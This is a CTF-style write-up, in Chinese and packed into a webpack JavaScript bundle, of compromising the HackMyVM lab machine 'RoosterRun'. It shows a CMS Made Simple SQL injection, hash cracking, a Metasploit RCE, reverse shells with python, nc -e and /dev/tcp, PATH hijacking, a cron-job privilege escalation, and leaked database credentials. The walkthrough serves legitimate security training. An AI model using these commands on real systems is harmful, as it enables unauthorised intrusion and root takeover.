"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[8728],{5662:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>r,default:()=>m,frontMatter:()=>a,metadata:()=>i,toc:()=>l});var t=s(5893),o=s(1151);const a={},r="RoosterRun",i={id:"HackMyVM/Machines/RoosterRun/index",title:"RoosterRun",description:"[Linux VM] [Tested on VirtualBox] created by || cromiphi",source:"@site/docs/HackMyVM/Machines/RoosterRun/index.md",sourceDirName:"HackMyVM/Machines/RoosterRun",slug:"/HackMyVM/Machines/RoosterRun/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/RoosterRun/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/RoosterRun/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Pwned",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Pwned/"},next:{title:"Slowman",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Slowman/"}},c={},l=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"web \u670d\u52a1",id:"web-\u670d\u52a1",level:2},{value:"CMS Made Simple \u540e\u53f0",id:"cms-made-simple-\u540e\u53f0",level:3},{value:"User - www-data",id:"user---www-data",level:2},{value:"mysql \u51ed\u636e\u6cc4\u9732",id:"mysql-\u51ed\u636e\u6cc4\u9732",level:3},{value:"\u63a2\u6d4b\u63d0\u6743",id:"\u63a2\u6d4b\u63d0\u6743",level:3},{value:"User - matthieu",id:"user---matthieu",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u5c1d\u8bd5\u63d0\u6743",id:"\u5c1d\u8bd5\u63d0\u6743",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag - root",id:"flag---root",level:3}];function d(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",p:"p",pre:"pre",...(0,o.a)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"roosterrun",children:"RoosterRun"}),"\n",(0,t.jsxs)(n.admonition,{type:"note",children:[(0,t.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || cromiphi"}),(0,t.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2023-11-28"}),(0,t.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 51ba3f43f1a914e1334efb64cb782767"}),(0,t.jsx)(n.p,{children:"\u2620 Root // 39"}),(0,t.jsx)(n.p,{children:"\ud83d\udc80 User // 45"}),(0,t.jsx)(n.p,{children:"\ud83d\udcddNotes //\nEnjoy it."})]}),"\n",(0,t.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,t.jsx)(n.p,{children:"\u9776\u673a IP"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.105\n"})}),"\n",(0,t.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"Nmap scan report for 192.168.56.105\nHost is up (0.00047s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)\n| ssh-hostkey:\n|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)\n|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)\n80/tcp open  http    Apache httpd 2.4.57 ((Debian))\n|_http-title: Home - Blog\n|_http-server-header: Apache/2.4.57 (Debian)\n|_http-generator: CMS Made Simple - Copyright (C) 2004-2023. All rights reserved.\n"})}),"\n",(0,t.jsx)(n.h2,{id:"web-\u670d\u52a1",children:"web \u670d\u52a1"}),"\n",(0,t.jsxs)(n.p,{children:["\u5c1d\u8bd5\u4f7f\u7528 ",(0,t.jsx)(n.a,{href:"https://www.exploit-db.com/exploits/46635",children:"CMS Made Simple < 2.2.10 - SQL Injection"})," \u83b7\u53d6\u4fe1\u606f"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"[+] Salt for password found: 1a0112229fbd699d\n[+] Username found: admin\n[+] Email found: admin@localhost.com\n[+] Password found: 4f943036486b9ad48890b2efbf7735a8\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u7834\u89e3\u5bc6\u7801"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $cat hash.txt\nadmin:4f943036486b9ad48890b2efbf7735a8$1a0112229fbd699d\n\u250c\u2500[\u2717]\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt -rules=best64 -format=dynamic_4\nhomeandaway      (admin)\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5229\u7528\u8fd9\u4e2a\u51ed\u636e\uff0c\u5c31\u53ef\u4ee5\u987a\u5229\u767b\u5f55\u540e\u53f0"}),"\n",(0,t.jsx)(n.h3,{id:"cms-made-simple-\u540e\u53f0",children:"CMS Made Simple \u540e\u53f0"}),"\n",(0,t.jsx)(n.p,{children:"\u5229\u7528 metasploit \u8fdb\u884c\u81ea\u52a8\u5316\u6253\u51fb"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"[msf](Jobs:0 Agents:0) exploit(multi/http/cmsms_object_injection_rce) >> show options\n\nModule options (exploit/multi/http/cmsms_object_injection_rce):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   PASSWORD   homeandaway      yes       Password to authenticate with\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     192.168.56.105   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\n   RPORT      80               yes       The target port (TCP)\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI  /                yes       Base cmsms directory path\n   USERNAME   admin            yes       Username to authenticate with\n   VHOST                       no        HTTP server virtual host\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:'[msf](Jobs:0 Agents:0) exploit(multi/http/cmsms_object_injection_rce) >> exploit\n\n[*] Started reverse TCP handler on 192.168.56.102:4444\n[*] Running automatic check ("set AutoCheck false" to disable)\n[+] The target appears to be vulnerable.\n[*] Sending stage (39927 bytes) to 192.168.56.105\n[+] Deleted SWSyWDIkwT.php\n[*] Meterpreter session 1 opened (192.168.56.102:4444 -> 192.168.56.105:42034) at 2024-02-12 16:26:12 +0800\n\n(Meterpreter 1)(/var/www/html/admin) > shell\nProcess 3356 created.\nChannel 0 created.\npython3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")\'\n'})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $pwncat-cs -lp 9999\n[16:27:01] Welcome to pwncat \ud83d\udc08!                                                                                                                                                                 __main__.py:164\n[16:27:42] received connection from 192.168.56.105:46936                                                                                                                                              bind.py:84\n[16:27:42] 192.168.56.105:46936: registered new host w/ db                                                                                                                                        manager.py:957\n(local) pwncat$ back\n(remote) www-data@rooSter-Run:/var/www/html/admin$ whoami\nwww-data\n"})}),"\n",(0,t.jsx)(n.h2,{id:"user---www-data",children:"User - www-data"}),"\n",(0,t.jsx)(n.p,{children:"\u63a2\u6d4b\u7f51\u7ad9\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u53d1\u73b0\u4ee5\u4e0b\u4fe1\u606f"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-php",metastring:'title="/var/www/html/config.php"',children:"<?php\n# CMS Made Simple Configuration File\n# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference\n#\n$config['dbms'] = 'mysqli';\n$config['db_hostname'] = 'localhost';\n$config['db_username'] = 'admin';\n$config['db_password'] = 'j42W9kDq9dN9hK';\n$config['db_name'] = 'cmsms_db';\n$config['db_prefix'] = 'cms_';\n$config['timezone'] = 'Europe/Berlin';\n"})}),"\n",(0,t.jsx)(n.h3,{id:"mysql-\u51ed\u636e\u6cc4\u9732",children:"mysql \u51ed\u636e\u6cc4\u9732"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-sql",children:"MariaDB [cmsms_db]> show tables;\n+--------------------------------+\n| Tables_in_cmsms_db             |\n+--------------------------------+\n| cms_additional_users           |\n| cms_additional_users_seq       |\n| cms_admin_bookmarks            |\n| cms_admin_bookmarks_seq        |\n| cms_adminlog                   |\n| cms_content                    |\n| cms_content_props              |\n| cms_content_props_seq          |\n| cms_content_seq                |\n| cms_event_handler_seq          |\n| cms_event_handlers             |\n| cms_events                     |\n| cms_events_seq                 |\n| cms_group_perms                |\n| cms_group_perms_seq            |\n| cms_groups                     |\n| cms_groups_seq                 |\n| cms_layout_design_cssassoc     |\n| cms_layout_design_tplassoc     |\n| cms_layout_designs             |\n| cms_layout_stylesheets         |\n| cms_layout_templates           |\n| cms_layout_tpl_addusers        |\n| cms_layout_tpl_categories      |\n| cms_layout_tpl_type            |\n| cms_locks                      |\n| cms_mod_cmsjobmgr              |\n| cms_mod_filepicker_profiles    |\n| cms_module_deps                |\n| cms_module_news                |\n| cms_module_news_categories     |\n| cms_module_news_categories_seq |\n| cms_module_news_fielddefs      |\n| cms_module_news_fieldvals      |\n| cms_module_news_seq            |\n| cms_module_search_index        |\n| cms_module_search_items        |\n| cms_module_search_items_seq    |\n| cms_module_search_words        |\n| cms_module_smarty_plugins      |\n| cms_module_templates           |\n| cms_modules                    |\n| cms_permissions                |\n| cms_permissions_seq            |\n| cms_routes                     |\n| cms_siteprefs                  |\n| cms_user_groups                |\n| cms_userplugins                |\n| cms_userplugins_seq            |\n| cms_userprefs                  |\n| cms_users                      |\n| cms_users_seq                  |\n| cms_version                    |\n+--------------------------------+\n"})}),"\n",(0,t.jsx)(n.h3,{id:"\u63a2\u6d4b\u63d0\u6743",children:"\u63a2\u6d4b\u63d0\u6743"}),"\n",(0,t.jsx)(n.p,{children:"\u5728\u63a2\u6d4b\u7528\u6237\u76ee\u5f55\u7684\u65f6\u5019\uff0c\u53d1\u73b0\u4ee5\u4e0b\u6587\u4ef6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",metastring:'title="/home/matthieu/StaleFinder"',children:'#!/usr/bin/env bash\n\nfor file in ~/*; do\n    if [[-f $file]]; then\n        if [[! -s $file]]; then\n            echo "$file is empty."\n        fi\n\n        if [[$(find "$file" -mtime +365 -print) ]]; then\n            echo "$file hasn\'t been modified for over a year."\n        fi\n    fi\ndone\n'})}),"\n",(0,t.jsxs)(n.p,{children:["\u76ee\u6d4b\u662f\u4e00\u79cd\u5b9a\u671f\u6267\u884c\u7684\u811a\u672c\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u901a\u8fc7\u63a7\u5236\u73af\u5883\u53d8\u91cf\u4e2d\u7684 ",(0,t.jsx)(n.code,{children:"bash"})," \u6765\u5b9e\u73b0\u63d0\u6743"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@rooSter-Run:/home/matthieu$ echo -e '#!/bin/bash\\nnc 192.168.56.102 8888 -e /bin/bash' > /usr/local/bin/bash\n(remote) www-data@rooSter-Run:/home/matthieu$ chmod 777 /usr/local/bin/bash\n\u250c\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $pwncat-cs -lp 8888\n[19:41:59] Welcome to pwncat \ud83d\udc08!\n[19:42:01] received connection from 192.168.56.105:33504\n[19:42:02] 0.0.0.0:8888: normalizing shell path\n           192.168.56.105:33504: registered new host w/ db\n(local) pwncat$ back\n(remote) matthieu@rooSter-Run:/home/matthieu$ whoami\nmatthieu\n"})}),"\n",(0,t.jsx)(n.h2,{id:"user---matthieu",children:"User - matthieu"}),"\n",(0,t.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) matthieu@rooSter-Run:/home/matthieu$ cat user.txt\n32af3c9a9cb2fb748aef29457d8cff55\n"})}),"\n",(0,t.jsx)(n.h3,{id:"\u5c1d\u8bd5\u63d0\u6743",children:"\u5c1d\u8bd5\u63d0\u6743"}),"\n",(0,t.jsx)(n.p,{children:"\u5bf9\u5e38\u89c1\u76ee\u5f55\u8fdb\u884c\u63a2\u6d4b"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",metastring:'title="/opt/maintenance/backup.sh"',children:'#!/bin/bash\n\nPROD="/opt/maintenance/prod-tasks"\nPREPROD="/opt/maintenance/pre-prod-tasks"\n\n\nfor file in "$PREPROD"/*; do\n  if [[-f $file && "${file##*.}" = "sh" ]]; then\n    cp "$file" "$PROD"\n  else\n    rm -f ${file}\n  fi\ndone\n\nfor file in "$PROD"/*; do\n  if [[-f $file && ! -O $file]]; then\n  rm ${file}\n  fi\ndone\n\n/usr/bin/run-parts /opt/maintenance/prod-tasks\n'})}),"\n",(0,t.jsxs)(n.p,{children:["\u501f\u52a9\u8fd9\u4e2a\u811a\u672c\uff0c\u53ef\u4ee5\u5c06\u5305\u542b\u6709\u6076\u610f\u8f7d\u8377\u7684\u811a\u672c\u653e\u7f6e\u4e8e ",(0,t.jsx)(n.code,{children:"/opt/maintenance/pre-prod-tasks"})," \u76ee\u5f55\u4e2d\uff0c\u8ba9\u8fd9\u4e2a\u5b9a\u65f6\u4efb\u52a1\u53bb\u6267\u884c"]}),"\n",(0,t.jsx)(n.p,{children:"\u9996\u5148\uff0c\u5148\u521b\u5efa\u4e00\u4e2a\u5305\u542b\u6709\u6076\u610f\u8f7d\u8377\u7684\u811a\u672c"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ echo '#!/bin/bash' > exp.sh\n(remote) matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ echo '/bin/bash -c\"/bin/bash -i >& /dev/tcp/192.168.56.102/5555 0>&1\"' >> exp.sh\n(remote) matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ cat exp.sh\n#!/bin/bash\n/bin/bash -c \"/bin/bash -i >& /dev/tcp/192.168.56.102/5555 0>&1\"\n(remote) matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ chmod 777 exp.sh\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u7136\u540e\u7a0d\u7b49\u7247\u523b\uff0c\u6587\u4ef6\u5c31\u4f1a\u88ab\u5b9a\u65f6\u4efb\u52a1\u590d\u5236\u5230 ",(0,t.jsx)(n.code,{children:"/opt/maintenance/prod-tasks"})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) matthieu@rooSter-Run:/opt/maintenance/prod-tasks$ ls -lh\ntotal 20K\n-rwxr-xr-x 1 root root 77 Feb 13 03:23 exp.sh\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c06\u6587\u4ef6\u8fdb\u884c\u91cd\u547d\u540d"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) matthieu@rooSter-Run:/opt/maintenance/prod-tasks$ ls -lh\ntotal 20K\n-rwxr-xr-x 1 root root 77 Feb 13 03:23 exp\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u91cd\u547d\u540d\u540e\u7a0d\u7b49\u7247\u523b\uff0c\u5373\u53ef\u6536\u5230\u56de\u8fde\u7684 shell"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $nc -lvnp 5555\nlistening on [any] 5555 ...\nconnect to [192.168.56.102] from (UNKNOWN) [192.168.56.105] 58044\nbash: cannot set terminal process group (47863): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@rooSter-Run:~# whoami\nroot\n"})}),"\n",(0,t.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,t.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"root@rooSter-Run:~# cat root.txt\n670ff72e9d8099ac39c74c080348ec17\n"})})]})}function m(e={}){const{wrapper:n}={...(0,o.a)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},1151:(e,n,s)=>{s.d(n,{Z:()=>i,a:()=>r});var t=s(7294);const o={},a=t.createContext(o);function r(e){const n=t.useContext(a);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:r(e.components),t.createElement(a.Provider,{value:n},e.children)}}}]);